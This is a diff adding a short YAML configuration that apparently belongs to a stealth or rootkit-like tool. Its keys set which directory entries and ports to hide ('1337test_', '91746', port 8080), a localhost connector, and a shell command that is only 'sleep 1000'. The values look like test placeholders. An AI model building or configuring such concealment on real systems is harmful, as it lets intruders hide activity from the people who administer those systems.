@@ -1,0 +1,11 @@
+hideme: false
+connector: 
+    ip: "127.0.0.1"
+    port: "8080"
+hide_dent:
+    - "91746"
+    - "1337test_"
+hide_port:
+    - "8080"
+shells:
+    - "sleep 1000"
